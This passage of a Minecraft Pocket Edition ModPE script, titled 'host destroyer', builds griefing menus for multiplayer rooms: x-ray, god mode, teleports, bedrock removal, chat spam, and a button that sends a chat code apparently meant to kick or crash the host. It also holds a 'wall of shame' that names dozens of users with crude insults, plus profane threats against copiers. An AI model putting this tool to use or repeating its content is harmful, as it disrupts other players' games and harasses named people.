0\n金铲, id: 284, 特殊值: 0\n金镐, id: 285, 特殊值: 0\n金斧, id: 286, 特殊值: 0\n线, id: 287, 特殊值: 0\n羽毛, id: 288, 特殊值: 0\n火药, id: 289, 特殊值: 0\n木锄, id: 290, 特殊值: 0\n石锄, id: 291, 特殊值: 0\n铁锄, id: 292, 特殊值: 0\n钻石锄, id: 293, 特殊值: 0\n金锄, id: 294, 特殊值: 0\n小麦种子, id: 295, 特殊值: 0\n小麦, id: 296, 特殊值: 0\n面包, id: 297, 特殊值: 0\n皮革帽子, id: 298, 特殊值: 0\n皮革外套, id: 299, 特殊值: 0\n皮革裤子, id: 300, 特殊值: 0\n皮革靴子, id: 301, 特殊值: 0\n锁链头盔, id: 302, 特殊值: 0\n锁链胸甲, id: 303, 特殊值: 0\n锁链护腿, id: 304, 特殊值: 0\n锁链靴子, id: 305, 特殊值: 0\n铁头盔, id: 306, 特殊值: 0\n铁胸甲, id: 307, 特殊值: 0\n铁护腿, id: 308, 特殊值: 0\n铁靴子, id: 309, 特殊值: 0\n钻石头盔, id: 310, 特殊值: 0\n钻石胸甲, id: 311, 特殊值: 0\n钻石护腿, id: 312, 特殊值: 0\n钻石靴子, id: 313, 特殊值: 0\n金头盔, id: 314, 特殊值: 0\n金胸甲, id: 315, 特殊值: 0\n金护腿, id: 316, 特殊值: 0\n金靴子, id: 317, 特殊值: 0\n燧石, id: 318, 特殊值: 0\n生猪排, id: 319, 特殊值: 0\n熟猪排, id: 320, 特殊值: 0\n画, id: 321, 特殊值: 0\n告示牌, id: 323, 特殊值: 0\n木门, id: 324, 特殊值: 0\n桶, id: 325, 特殊值: 0\n牛奶桶, id: 325, 特殊值: 1\n水桶, id: 325, 特殊值: 8\n岩浆桶, id: 325, 特殊值: 10\n矿车, id: 328, 特殊值: 0\n鞍, id: 329, 特殊值: 0\n铁门, id: 330, 特殊值: 0\n红石, id: 331, 特殊值: 0\n雪球, id: 332, 特殊值: 0\n皮革, id: 334, 特殊值: 0\n红砖, id: 336, 特殊值: 0\n粘土, id: 337, 特殊值: 0\n甘蔗, id: 338, 特殊值: 0\n纸, id: 339, 特殊值: 0\n书, id: 340, 特殊值: 0\n粘液球, id: 341, 特殊值: 0\n蛋, id: 344, 特殊值: 0\n指南针, id: 345, 特殊值: 0\n钟, id: 347, 特殊值: 0\n萤石粉, id: 348, 特殊值: 0\n墨囊（染料）, id: 351, 特殊值: 0\n玫瑰红（染料）, id: 351, 特殊值: 1\n仙人掌绿（染料）, id: 351, 特殊值: 2\n可可豆（染料）, id: 351, 特殊值: 3\n青金石（染料）, id: 351, 特殊值: 4\n紫色染料, id: 351, 特殊值: 5\n青色染料, id: 351, 特殊值: 6\n淡灰色染料, id: 351, 特殊值: 7\n灰色染料, id: 351, 特殊值: 8\n粉红色染料, id: 351, 特殊值: 9\n黄绿色染料, id: 351, 特殊值: 10\n蒲公英黄（染料）, id: 351, 特殊值: 11\n淡蓝色染料, id: 351, 特殊值: 12\n品红色染料, id: 351, 特殊值: 13\n橙色染料, id: 351, 特殊值: 14\n骨粉, id: 351, 特殊值: 15\n骨头, id: 352, 特殊值: 0\n糖, id: 353, 特殊值: 0\n蛋糕, id: 354, 特殊值: 0\n床, id: 355, 特殊值: 0\n饼干, id: 357, 特殊值: 0\n剪刀, id: 359, 特殊值: 0\n西瓜片, id: 360, 特殊值: 0\n南瓜种子, id: 261, 特殊值: 0\n西瓜种子, id: 362, 特殊值: 0\n生牛肉, id: 363, 特殊值: 0\n牛排, id: 364, 特殊值: 0\n生鸡肉, id: 365, 特殊值: 0\n熟鸡肉, id: 366, 特殊值: 0\n绿宝石, id: 388, 特殊值: 0\n胡萝卜, id: 391, 特殊值: 0\n马铃薯, id: 392, 特殊值: 0\n烤马铃薯, id: 393, 特殊值: 0\n南瓜派, id: 400, 特殊值: 0\n地狱砖, id: 405, 特殊值: 0\n地狱石英, id: 406, 特殊值: 0\n甜菜, id: 457, 特殊值: 0\n甜菜种子, id: 458, 特殊值: 0\n甜菜汤, id: 459, 特殊值: 0"
var 方块ID一览表 = "石头, id: 1, 特殊值: 0\n花岗岩, id: 1, 特殊值: 1\n光滑的花岗岩, id: 1, 特殊值: 2\n闪长岩, id: 1, 特殊值: 3\n光滑的闪长岩, id: 1, 特殊值: 4\n安山岩, id: 1, 特殊值: 5\n光滑的安山岩, id: 1, 特殊值: 6\n草方块, id: 2, 特殊值: 0\n泥土, id: 3, 特殊值: 0\n圆石, id: 4, 特殊值: 0\n木板, id: 5, 特殊值: 0\n松木板, id: 5, 特殊值: 1\n桦木板, id: 5, 特殊值: 2\n丛林木板, id: 5, 特殊值: 3\n金合欢木板, id: 5, 特殊值: 4\n黑橡木木板, id: 5, 特殊值: 5\n树苗, id: 6, 特殊值: 0\n松树苗, id: 6, 特殊值: 1\n桦树苗, id: 6, 特殊值: 2\n丛林树苗, id: 6, 特殊值: 3\n金合欢树苗, id: 6, 特殊值: 4\n黑橡树苗, id: 6, 特殊值: 5\n基岩, id: 7, 特殊值: 0\n水, id: 8, 特殊值: 0\n静止的水, id: 9, 特殊值: 0\n岩浆, id: 10, 特殊值: 0\n静止的岩浆, id: 11, 特殊值: 0\n沙子, id: 12, 特殊值: 0\n红沙, id: 12, 特殊值: 1\n砂砾, id: 13, 特殊值: 0\n金矿石, id: 14, 特殊值: 0\n铁矿石, id: 15, 特殊值: 0\n煤矿石, id: 16, 特殊值: 0\n木头, id: 17, 特殊值: 0\n松木, id: 17, 特殊值: 1\n桦木, id: 17, 特殊值: 2\n丛林木, id: 17, 特殊值: 3\n树叶, id: 18, 特殊值: 0\n松树叶, id: 18, 特殊值: 1\n桦树叶, id: 18, 特殊值: 2\n丛林树叶, id: 18, 特殊值: 3\n海绵, id: 19, 特殊值: 0\n玻璃, id: 20, 特殊值: 0\n青金石矿石, id: 21, 特殊值: 0\n青金石块, id: 22, 特殊值: 0\n沙石, id: 24, 特殊值: 0\n錾制沙石, id: 24, 特殊值: 1\n平滑沙石, id: 24, 特殊值: 2\n动力铁轨, id: 27, 特殊值: 0\n蜘蛛网, id: 30, 特殊值: 0\n草, id: 31, 特殊值: 1\n灌木, id: 31, 特殊值: 2\n枯死的灌木, id: 32, 特殊值: 0\n白色羊毛, id: 35, 特殊值: 0\n橙色羊毛, id: 35, 特殊值: 1\n品红色羊毛, id: 35, 特殊值: 2\n淡蓝色羊毛, id: 35, 特殊值: 3\n黄色羊毛, id: 35, 特殊值: 4\n黄绿色羊毛, id: 35, 特殊值: 5\n粉红色羊毛, id: 35, 特殊值: 6\n灰色羊毛, id: 35, 特殊值: 7\n淡灰色羊毛, id: 35, 特殊值: 8\n青色羊毛, id: 35, 特殊值: 9\n紫色羊毛, id: 35, 特殊值: 10\n蓝色羊毛, id: 35, 特殊值: 11\n棕色羊毛, id: 35, 特殊值: 12\n绿色羊毛, id: 35, 特殊值: 13\n红色羊毛, id: 35, 特殊值: 14\n黑色羊毛, id: 35, 特殊值: 15\n蒲公英, id: 37, 特殊值: 0\n罂粟, id: 38, 特殊值: 0\n蓝色的兰花, id: 38, 特殊值: 1\n露西球, id: 38, 特殊值: 2\n矢车菊, id: 38, 特殊值: 3\n红郁金香, id: 38, 特殊值: 4\n橙郁金香, id: 38, 特殊值: 5\n白郁金香, id: 38, 特殊值: 6\n粉郁金香, id: 38, 特殊值: 7\n雏菊, id: 38, 特殊值: 8\n棕色蘑菇, id: 39, 特殊值: 0\n红色蘑菇, id: 40, 特殊值: 0\n金块, id: 41, 特殊值: 0\n铁块, id: 42, 特殊值: 0\n石台阶, id: 44, 特殊值: 0\n沙石台阶, id: 44, 特殊值: 1\n圆石台阶, id: 44, 特殊值: 3\n砖台阶, id: 44, 特殊值: 4\n石砖台阶, id: 44, 特殊值: 5\n石英台阶, id: 44, 特殊值: 7\n砖块, id: 45, 特殊值: 0\nTNT, id: 46, 特殊值: 0\n书架, id: 47, 特殊值: 0\n苔石, id: 48, 特殊值: 0\n黑曜石, id: 49, 特殊值: 0\n火把, id: 50, 特殊值: 0\n火, id: 51, 特殊值: 0\n刷怪笼, id: 52, 特殊值: 0\n木楼梯, id: 53, 特殊值: 0\n箱子, id: 54, 特殊值: 0\n钻石矿石, id: 56, 特殊值: 0\n钻石块, id: 57, 特殊值: 0\n工作台, id: 58, 特殊值: 0\n耕地, id: 60, 特殊值: 0\n熔炉, id: 61, 特殊值: 0\n梯子, id: 65, 特殊值: 0\n铁轨, id: 66, 特殊值: 0\n石楼梯, id: 67, 特殊值: 0\n红石矿石, id: 73, 特殊值: 0\n雪, id: 78, 特殊值: 0\n冰, id: 79, 特殊值: 0\n雪块, id: 80, 特殊值: 0\n仙人掌, id: 81, 特殊值: 0\n粘土块, id: 82, 特殊值: 0\n木栅栏, id: 85, 特殊值: 0\n南瓜, id: 86, 特殊值: 0\n地狱岩, id: 87, 特殊值: 0\n萤石, id: 89, 特殊值: 0\n南瓜灯, id: 91, 特殊值: 0\n隐形基岩, id: 95, 特殊值: 0\n活板门, id: 96, 特殊值: 0\n石砖, id: 98, 特殊值: 0\n苔石砖, id: 98, 特殊值: 1\n裂石砖, id: 98, 特殊值: 2\n回形石砖, id: 98, 特殊值: 3\n棕色蘑菇方块, id: 99, 特殊值: 14\n红色蘑菇方块, id: 100, 特殊值: 14\n蘑菇方块, id: 99, 特殊值: 0\n蘑菇茎, id: 99, 特殊值: 15\n铁栅栏, id: 101, 特殊值: 0\n玻璃板, id: 102, 特殊值: 0\n西瓜, id: 103, 特殊值: 0\n南瓜梗, id: 104, 特殊值: 0\n西瓜梗, id: 105, 特殊值: 0\n藤蔓, id: 106, 特殊值: 0\n栅栏门, id: 107, 特殊值: 0\n砖楼梯, id: 108, 特殊值: 0\n石砖楼梯, id: 109, 特殊值: 0\n菌丝, id: 110, 特殊值: 0\n莲叶, id: 111, 特殊值: 0\n地狱砖, id: 112, 特殊值: 0\n地狱砖楼梯, id: 114, 特殊值: 0\n末地传送门, id: 120, 特殊值: 0\n末地石, id: 121, 特殊值: 0\n可可梗, id: 127, 特殊值: 0\n沙石楼梯, id: 128, 特殊值: 0\n绿宝石矿石, id: 129, 特殊值: 0\n绿宝石块, id: 133, 特殊值: 0\n松木楼梯, id: 134, 特殊值: 0\n桦木楼梯, id: 135, 特殊值: 0\n丛林楼梯, id: 136, 特殊值: 0\n圆石墙, id: 139, 特殊值: 0\n苔石墙, id: 139, 特殊值: 1\n石英方块, id: 155, 特殊值: 0\n錾石英方块, id: 155, 特殊值: 1\n柱石英方块, id: 155, 特殊值: 2\n石英楼梯, id: 156, 特殊值: 0\n木台阶, id: 158, 特殊值: 0\n松木台阶, id: 158, 特殊值: 1\n桦木台阶, id: 158, 特殊值: 2\n丛林木台阶, id: 158, 特殊值: 3\n金合欢木台阶, id: 158, 特殊值: 4\n黑橡木台阶, id: 158, 特殊值: 5\n白色粘土, id: 159, 特殊值: 0\n橙色粘土, id: 159, 特殊值: 1\n品红色粘土, id: 159, 特殊值: 2\n淡蓝色粘土, id: 159, 特殊值: 3\n黄色粘土, id: 159, 特殊值: 4\n黄绿色粘土, id: 159, 特殊值: 5\n粉红色粘土, id: 159, 特殊值: 6\n灰色粘土, id: 159, 特殊值: 7\n淡灰色粘土, id: 159, 特殊值: 8\n青色粘土, id: 159, 特殊值: 9\n紫色粘土, id: 159, 特殊值: 10\n蓝色粘土, id: 159, 特殊值: 11\n棕色粘土, id: 159, 特殊值: 12\n绿色粘土, id: 159, 特殊值: 13\n红色粘土, id: 159, 特殊值: 14\n黑色粘土, id: 159, 特殊值: 15\n金合欢树叶, id: 161, 特殊值: 0\n黑橡木叶, id: 161, 特殊值: 1\n金合欢木, id: 162, 特殊值: 0\n黑橡木, id: 162, 特殊值: 1\n金合欢木楼梯, id: 163, 特殊值: 0\n黑橡木楼梯, id: 164, 特殊值: 0\n干草块, id: 170, 特殊值: 0\n白色地毯, id: 171, 特殊值: 0\n橙色地毯, id: 171, 特殊值: 1\n品红色地毯, id: 171, 特殊值: 2\n淡蓝色地毯, id: 171, 特殊值: 3\n黄色地毯, id: 171, 特殊值: 4\n黄绿色地毯, id: 171, 特殊值: 5\n粉红色地毯, id: 171, 特殊值: 6\n灰色地毯, id: 171, 特殊值: 7\n淡灰色地毯, id: 171, 特殊值: 8\n青色地毯, id: 171, 特殊值: 9\n紫色地毯, id: 171, 特殊值: 10\n蓝色地毯, id: 171, 特殊值: 11\n棕色地毯, id: 171, 特殊值: 12\n绿色地毯, id: 171, 特殊值: 13\n红色地毯, id: 171, 特殊值: 14\n黑色地毯, id: 171, 特殊值: 15\n硬化粘土, id: 172, 特殊值: 0\n煤炭块, id: 173, 特殊值: 0\n浮冰（不知和冰有何区别）, id: 174, 特殊值: 0\n太阳花, id: 175, 特殊值: 0\n丁香花, id: 175, 特殊值: 1\n高草, id: 175, 特殊值: 2\n高大灌木, id: 175, 特殊值: 3\n玫瑰丛, id: 175, 特殊值: 4\n芍药, id: 175, 特殊值: 5\n灰化土, id: 243, 特殊值: 0\n切石机, id: 245, 特殊值: 0\n发光的黑曜石, id: 246, 特殊值: 0\n下界反应核, id: 247, 特殊值: 0\n更新方块1, id: 248, 特殊值: 0\n更新方块2, id: 249, 特殊值: 0"

/*我操你婊子黑妈的还看*/
/*抄袭者亲妈炸裂*/
/*抄袭者杀无赦*/
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
var GUI;
ctx.runOnUiThread(new java.lang.Runnable({
    run: function() {
        try {
            var layout2 = new android.widget.LinearLayout(ctx);
            layout2.setOrientation(1);
            var scroll2 = new android.widget.ScrollView(ctx);
            scroll2.addView(layout2);
            var txt = new android.widget.TextView(ctx);
            var dialog = new android.app.Dialog(ctx);
            dialog.setContentView(scroll2);
            dialog.setTitle("特别挂狗");
            layout2.addView(txt); //txt
            txt.setText(弱智意淫废物);
            var zuang = new android.widget.Button(ctx);
            zuang.setOnClickListener(new android.view.View.OnClickListener() {
                onClick: function(viewarg) {
                    dialog.dismiss()
                }
            });
            zuang.setText("知道了");
            layout2.addView(zuang)
            dialog.show();
        } catch (err) {
            print("Err: " + err);
        }
    }
}));


function dip2px(ctx, dips) {
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
}

function openMenu() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    var layout = new android.widget.LinearLayout(ctx)
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true)
        var layout = new android.widget.LinearLayout(ctx)
        layout.setOrientation(1)
        var va = new android.widget.TextView(ctx)
        va.setText("   房主毁灭者v10.2")
        va.setTextSize(20)
        layout.addView(va)

        var ve = new android.widget.TextView(ctx)
        ve.setText("  by summer 2")
        ve.setTextSize(12)
        layout.addView(ve)

        var ve = new android.widget.TextView(ctx)
        ve.setText("  分界线君  ")
        ve.setTextSize(12)
        layout.addView(ve)



        var vb = new android.widget.Button(ctx)
        vb.setText("辅助类")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                summer()
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("熊房类")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                毁灭公爵()
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("调戏房主")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                章鱼脑膜()
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("刷屏")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                野猪警察()
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("玩家列表")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                玩家检测()
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("特别感谢")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                狩猎机器人()
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("添加物品")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                添加物品()
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("挂狗墙")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var of = 0;
                var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
                var ad = android.app.AlertDialog.Builder
                ctx.runOnUiThread(new java.lang.Runnable({
                    run: function() {
                        try {
                            var d = new ad(ctx)
                            d.setNegativeButton("原来我儿子有这么多", new android.content.DialogInterface.OnClickListener() {
                                onClick: function(dia, w) {}
                            })
                            d.setTitle("挂狗墙")
                            d.setMessage("9月挂狗墙\n3楼名称：神话y\n被挂原因：外传碎梦\n3楼名称：6666\n被挂原因：伸手废物伸手魔盒\n3楼名称：乙!\n被挂原因：伸手废物企图伸手碎梦\n3楼名称：我的世界熊，碎梦\n被挂原因：伸手废物伸手摧毁商店js和防踢js\n3楼名称：张雪\n被挂原因：外传碎梦\n3楼名称：star💘\n被挂原因：伸手废物伸手日妈平台\n3楼名称：好人\n被挂原因：伸手废物伸手日妈魔盒\n3楼名称：長情\n被挂原因：伸手废物伸手日妈平台\n3楼名称：孙爷\n被挂原因:伸手废物伸手碎梦\n3楼名称：jffhhh\n被挂原因：弱智废物外传熊房资源\n3楼名称：就这个臭宇\n被挂原因：外传废物外传熊房资源\n3楼名称：不厉害的小孩\n被挂原因：弱智废物外传熊房资源\n3楼名称：我了个去\n被挂原因：伸手废物伸手创背\n3楼名称：末影叶🔱🍃\n被挂原因：伸手废物伸手创背和碎梦\n3楼名称：韩冷\n被挂原因：伸手废物伸手日妈平台\n3楼名称：极致君\n被挂原因：弱智废物伸手熊房资源\n3楼名称：333\n被挂原因：弱智废物伸手熊房资源\n3楼名称：汝you點瘋\n被挂原因：弱智废物伸手熊房资源\n3楼名称：梦境 子弦\n被挂原因：弱智废物伸手熊房资源\n3楼名称：嗜血法医\n被挂原因：弱智废物伸手熊房资源\n3楼名称：vb\n被挂原因：弱智废物伸手熊房资源\n3楼名称：超大布丁\n被挂原因：弱智废物伸手熊房资源\n3楼名称：随风飘扬 醉逍遥\n被挂原因：弱智废物伸手熊房资源\n3楼名称：我要爬到b站总部\n被挂原因：弱智废物伸手熊房资源\n3楼名称：SVIP_宠☆神\n被挂原因：弱智废物伸手熊房资源\n3楼名称：三楼🌹アイウエ\n被挂原因：弱智废物伸手熊房资源\n3楼名称：半夏微凉\n被挂原因：弱智废物伸手熊房资源\n3楼名称：利牙●乐神\n被挂原因：弱智废物伸手熊房资源\n3楼名称：淡然一笑\n被挂原因：弱智废物伸手碎梦\n3楼名称：萌系美女\n被挂原因：弱智废物伸手创背\n10月挂狗墙\n3楼名称：触手TV小强强\n被挂原因：伸手废物伸手碎梦，创背\n3楼名称：lllllp\n被挂原因：伸手废物伸手创背\n3楼名称：0📶移动4G\n被挂原因：伸手废物伸手创背\n3楼名称：小四 首席执行官\n被挂原因：伸手废物伸手创背\n3楼名称：黄家圣龙\n被挂原因：伸手废物伸手炸妈魔盒，炸妈平台\n三楼名称:明天到底会怎样\n被挂原因：伸手废物伸手碎梦\n三楼名称：C(･ิϖ･ิ)\n被挂原因：弱智废物伸手熊房资源\n3楼名称：真是奇怪le\n被挂原因：弱智外传狗外传碎梦\n3楼名称：狂少丶方\n被挂原因：弱智废物伸手创背\n3楼名称：jffhhh\n被挂原因：弱智废物外传创背\n3楼名称：五歌歌。\n被挂原因：倒卖碎梦，理应死妈\n3楼名称：蚂蚁工坊🚗\n被挂原因：冒充创背原作者，并且外传创背\n3楼名称：liu\n被挂原因：弱智废物外传创背")
                            d.show()
                        } catch (e) {
                            print(e)
                        }
                    }
                }))


            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("其他功能")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                qc世界()
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("快捷方式")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                毁灭公爵新版本()
            }
        }))
        layout.addView(vb)


        var vb = new android.widget.Button(ctx)
        vb.setText("踢碎梦")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "房主我肏你血妈")
                Server.sendChat("碎梦者会毁掉你的梦");
                Server.sendChat("§X0167");
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("联盒外进")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {

            }
        }))
        layout.addView(vb)

        var mlayout = makeMenu(ctx, layout)
        menu.setContentView(mlayout)
        menu.setWidth(dip2px(ctx, 150))
        menu.setHeight(dip2px(ctx, 350))
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 16, 255)))
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 0), dip2px(ctx, 0))
    } catch (err) {
        print(err)
    }
}



function makeMenu(ctx, layout) {
    var mlayout = new android.widget.RelativeLayout(ctx)
    var svParams = new android.widget.RelativeLayout.LayoutParams(android.widget.RelativeLayout.LayoutParams.FILL_PARENT, android.widget.RelativeLayout.LayoutParams.FILL_PARENT)
    var scrollview = new android.widget.ScrollView(ctx)
    var pad = dip2px(ctx, 2)
    scrollview.setPadding(pad, pad, pad, pad)
    scrollview.setLayoutParams(svParams)
    scrollview.addView(layout)
    mlayout.addView(scrollview)
    return mlayout
}

function summer() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    var layout = new android.widget.LinearLayout(ctx)
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true)
        var layout = new android.widget.LinearLayout(ctx)
        layout.setOrientation(1)

        /*辅助类*/
        var va = new android.widget.TextView(ctx)
        va.setText("  辅助类  ")
        va.setTextSize(20)
        layout.addView(va)

        var vb = new android.widget.Button(ctx)
        vb.setText("设置重生点")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                print("已设置重生点")
                Level.setSpawn(Player.getX(), Player.getY() + 1, Player.getZ());

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("开启透视")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Block.setLightLevel(14, 20)
                Block.setLightLevel(15, 15)
                Block.setLightLevel(16, 15)
                Block.setLightLevel(21, 15)
                Block.setLightLevel(56, 15)
                Block.setLightLevel(73, 15)
                Block.setLightLevel(129, 15)
                Block.setLightLevel(153, 15)
                Block.setShape(14, 0.001, 0.001, 0.001, 0.999, 0.999, 0.999)
                Block.setShape(15, 0.001, 0.001, 0.001, 0.999, 0.999, 0.999)
                Block.setShape(16, 0.001, 0.001, 0.001, 0.999, 0.999, 0.999)
                Block.setShape(21, 0.001, 0.001, 0.001, 0.999, 0.999, 0.999)
                Block.setShape(56, 0.001, 0.001, 0.001, 0.999, 0.999, 0.999)
                Block.setShape(73, 0.001, 0.001, 0.001, 0.999, 0.999, 0.999)
                Block.setShape(129, 0.001, 0.001, 0.001, 0.999, 0.999, 0.999)
                Block.setShape(153, 0.001, 0.001, 0.001, 0.999, 0.999, 0.999)
                Block.setShape(3, 0, 1, 1, 1, 1, 1)
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("关闭透视")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Block.setShape(3, 0.001, 0.001, 0.001, 0.999, 0.999, 0.999)
            }
        }))
        layout.addView(vb)


        var vb = new android.widget.Button(ctx)
        vb.setText("血满")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Player.setHunger(120);
                Entity.setHealth(Player.getEntity(), 20);

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("清空背包")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var count = 0
                for (i = 9; i <= 44; i++) {
                    if (Player.getInventorySlot(i) !== 0) {
                        for (j = 1; j <= Player.getInventorySlotCount(i); j++) {
                            count++;
                        }
                        Player.clearInventorySlot(i);
                    }
                }

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("切换模式")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (Level.getGameMode() == 0) {
                    Level.setGameMode(1)
                    print("创造")
                } else if (Level.getGameMode() == 1) {
                    Level.setGameMode(0)
                    print("生存")
                }
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("一键钻石套")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Player.setArmorSlot(0, 310)
                Player.setArmorSlot(1, 311)
                Player.setArmorSlot(2, 312)
                Player.setArmorSlot(3, 313)
            }
        }))
        layout.addView(vb)


        var vb = new android.widget.Button(ctx)
        vb.setText("下雨")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Level.setRainLevel(true);
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("停雨")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Level.setRainLevel(false);
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("杀怪")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Level.setDifficulty(0)
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("调早上")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Level.setTime(24500);
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("调中午")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Level.setTime(5000);
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("调晚上")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Level.setTime(14500);
            }
        }))
        layout.addView(vb)

        var mlayout = makeMenu(ctx, layout)
        menu.setContentView(mlayout)
        menu.setWidth(dip2px(ctx, 150))
        menu.setHeight(dip2px(ctx, 350))
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 16, 255)))
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 150), dip2px(ctx, 0))
    } catch (err) {
        print(err)
    }
}

function 毁灭公爵() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    var layout = new android.widget.LinearLayout(ctx)
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true)
        var layout = new android.widget.LinearLayout(ctx)
        layout.setOrientation(1)

        var va = new android.widget.TextView(ctx)
        va.setText("  熊房类  ")
        va.setTextSize(20)
        layout.addView(va)


        var vb = new android.widget.Button(ctx)
        vb.setText("熊房模式")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.addEffect(Player.getEntity(), 1, 10000 * 20, 3, false, true);
                Entity.addEffect(Player.getEntity(), 8, 10000 * 20, 3, false, true);
                Entity.addEffect(Player.getEntity(), 12, 10000 * 20, 0, false, true);
                Entity.addEffect(Player.getEntity(), 13, 10000 * 20, 0, false, true);
                Entity.addEffect(Player.getEntity(), 11, 10000 * 20, 2, false, true);
                Entity.addEffect(Player.getEntity(), 5, 10000 * 20, 3, false, true);
                Entity.addEffect(Player.getEntity(), 16, 10000 * 20, 0, false, true);
                Entity.addEffect(Player.getEntity(), 10, 10000 * 20, 0, false, true);
                Level.setGameMode(1)
                Player.setHealth(32676)
                ModPE.showTipMessage("§5已修改为熊房模式 2");
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("遁地")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setPosition(Player.getEntity(), Player.getX(), Player.getY() - 3, Player.getZ())
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("升空")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setPosition(Player.getEntity(), Player.getX(), Player.getY() + 30, Player.getZ())
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("闪现")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setPosition(Player.getEntity(), Player.getX(), Player.getY(), Player.getZ() + 5)
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("消基岩")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var x = Player.getX()
                var y = Player.getY()
                var z = Player.getZ()
                for (var xx = x - 15; xx <= x + 15; xx++)
                    for (var yy = y - 15; yy <= y + 15; yy++)
                        for (var zz = z - 15; zz <= z + 15; zz++) {
                            if (getTile(xx, yy, zz) == 7 || getTile(xx, yy, zz) == 49) {
                                Level.setTile(xx, yy, zz, 0, 0);
                            }
                        };
                ModPE.showTipMessage("§4正在消除基岩和黑曜石");

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("神装")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
